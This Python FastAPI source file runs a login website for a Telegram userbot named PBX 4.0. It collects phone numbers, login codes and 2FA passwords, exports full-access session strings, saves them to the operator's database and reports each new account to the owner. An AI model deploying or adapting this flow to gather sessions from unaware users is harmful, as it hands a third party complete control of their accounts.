"""
app.py — PBX 4.0 Session Website (FastAPI)
- OTP + 2FA login
- Session auto-saved to DB
- Bot auto-notified (singleton client — no reconnect spam)
- Auto-restart after session add
"""

import asyncio
import os

from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from pyrogram import Client
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    SessionPasswordNeeded,
)

from Pbxbot.core.config import Config
from Pbxbot.core.database import db
from Pbxbot.core.logger import LOGS

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# ── In-memory state ──────────────────────────────────────────────
phone_code_hashes: dict[str, str]    = {}
client_sessions:   dict[str, Client] = {}

# ── Singleton notify bot — start once, reuse always ─────────────
_notify_bot: Client | None = None

async def _get_notify_bot() -> Client:
    global _notify_bot
    if _notify_bot and _notify_bot.is_connected:
        return _notify_bot
    bot = Client(
        name="PbxNotifyBot",
        api_id=Config.API_ID,
        api_hash=Config.API_HASH,
        bot_token=Config.BOT_TOKEN,
        in_memory=True,
    )
    await bot.start()
    _notify_bot = bot
    return bot

async def _notify(text: str) -> None:
    """Send message to owner — never crash the main flow."""
    try:
        bot = await _get_notify_bot()
        await bot.send_message(Config.OWNER_ID, text)
    except Exception as e:
        LOGS.warning(f"Notify bot error: {e}")

async def _auto_restart() -> None:
    """Restart app after session add so new user loads live."""
    await asyncio.sleep(3)
    try:
        heroku_key  = getattr(Config, "HEROKU_APIKEY",  None)
        heroku_name = getattr(Config, "HEROKU_APPNAME", None)
        if heroku_key and heroku_name:
            import heroku3
            heroku = heroku3.from_key(heroku_key)
            heroku.apps()[heroku_name].restart()
            return
    except Exception as e:
        LOGS.warning(f"Heroku restart failed: {e}")
    # Fallback — kill process so supervisor/Procfile restarts
    os.execv(__import__("sys").executable, [__import__("sys").executable] + __import__("sys").argv)


# ── Startup ──────────────────────────────────────────────────────
@app.on_event("startup")
async def startup_event():
    try:
        await db.connect()
        LOGS.info("✅ DB connected")
        # Pre-warm notify bot
        await _get_notify_bot()
        LOGS.info("✅ Notify bot ready")
    except Exception as e:
        LOGS.error(f"Startup error: {e}")


# ── Routes ───────────────────────────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.post("/send_otp", response_class=HTMLResponse)
async def send_otp(request: Request, phone_number: str = Form(...)):
    phone_number = phone_number.strip()
    if not phone_number.startswith("+") or not phone_number[1:].isdigit():
        return templates.TemplateResponse(
            "error.html",
            {"request": request, "error": "Phone number must include country code (e.g. +919876543210)."},
        )

    if await db.is_number_blocked(phone_number):
        return templates.TemplateResponse(
            "error.html",
            {"request": request, "error": "This number is blocked by PBX 4.0."},
        )

    # Cleanup old session for same number
    if phone_number in client_sessions:
        try:
            await client_sessions[phone_number].disconnect()
        except Exception:
            pass

    try:
        client = Client(
            name=f"PbxWeb_{phone_number}",
            api_id=Config.API_ID,
            api_hash=Config.API_HASH,
            in_memory=True,
            app_version="ᴘʙx ᴜsᴇʀʙᴏᴛ",
            device_model="ʙᴀᴅ ᴍᴜɴᴅᴀ",
            system_version="ᴘʙx 4.0",
        )
        await client.connect()
        sent = await client.send_code(phone_number)
        phone_code_hashes[phone_number] = sent.phone_code_hash
        client_sessions[phone_number]   = client

        await _notify(f"📞 **OTP Requested via Website**\n\nPhone: `{phone_number}`")
        return templates.TemplateResponse("otp.html", {"request": request, "phone_number": phone_number})

    except Exception as e:
        LOGS.error(f"send_otp error for {phone_number}: {e}")
        return templates.TemplateResponse(
            "error.html",
            {"request": request, "error": f"Failed to send OTP: {e}"},
        )


@app.post("/verify_otp", response_class=HTMLResponse)
async def verify_otp(
    request: Request,
    phone_number: str = Form(...),
    phone_code:   str = Form(...),
):
    client    = client_sessions.get(phone_number)
    code_hash = phone_code_hashes.get(phone_number)

    if not client or not code_hash:
        return templates.TemplateResponse(
            "error.html",
            {"request": request, "error": "Session expired. Please start over."},
        )

    try:
        await client.sign_in(phone_number, code_hash, phone_code.replace(" ", ""))

    except SessionPasswordNeeded:
        return templates.TemplateResponse(
            "two_factor.html",
            {"request": request, "phone_number": phone_number},
        )
    except PhoneCodeInvalid:
        return templates.TemplateResponse(
            "error.html", {"request": request, "error": "Invalid OTP code. Try again."},
        )
    except PhoneCodeExpired:
        _cleanup(phone_number)
        return templates.TemplateResponse(
            "error.html", {"request": request, "error": "OTP expired. Please start over."},
        )
    except Exception as e:
        _cleanup(phone_number)
        return templates.TemplateResponse(
            "error.html", {"request": request, "error": str(e)},
        )

    return await _finalize_session(request, phone_number, client)


@app.post("/submit_2fa", response_class=HTMLResponse)
async def submit_2fa(
    request:      Request,
    phone_number: str = Form(...),
    password:     str = Form(...),
):
    client = client_sessions.get(phone_number)
    if not client:
        return templates.TemplateResponse(
            "error.html",
            {"request": request, "error": "Session expired. Please start over."},
        )

    try:
        await client.check_password(password)
    except Exception as e:
        _cleanup(phone_number)
        return templates.TemplateResponse(
            "error.html", {"request": request, "error": f"Wrong 2FA password: {e}"},
        )

    return await _finalize_session(request, phone_number, client)


# ── Helpers ──────────────────────────────────────────────────────
def _cleanup(phone_number: str) -> None:
    phone_code_hashes.pop(phone_number, None)
    client_sessions.pop(phone_number, None)


async def _finalize_session(request: Request, phone_number: str, client: Client) -> HTMLResponse:
    """Export session, save to DB, notify owner, trigger restart."""
    try:
        session_string = await client.export_session_string()
        me             = await client.get_me()
        user_id        = me.id

        # Save to DB
        await db.update_session(user_id, session_string)

        # Save to Saved Messages
        try:
            await client.send_message(
                "me",
                f"**#PBX 4.0 SESSION**\n\n`{session_string}`\n\n**⚠️ DO NOT SHARE WITH ANYONE**",
            )
        except Exception:
            pass

        await client.disconnect()
        _cleanup(phone_number)

        # Notify owner
        await _notify(
            f"🎉 **New Session Added via Website!**\n\n"
            f"👤 [{me.first_name}](tg://user?id={user_id}) (`{user_id}`)\n"
            f"📞 Phone: `{phone_number}`\n\n"
            f"🔄 **Bot will auto-restart to load this session.**"
        )

        # Auto-restart so new user is live immediately
        asyncio.create_task(_auto_restart())

        return templates.TemplateResponse(
            "success.html",
            {"request": request, "session_string": session_string, "user_name": me.first_name},
        )

    except Exception as e:
        _cleanup(phone_number)
        LOGS.error(f"_finalize_session error: {e}")
        return templates.TemplateResponse(
            "error.html", {"request": request, "error": str(e)},
        )


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5050)
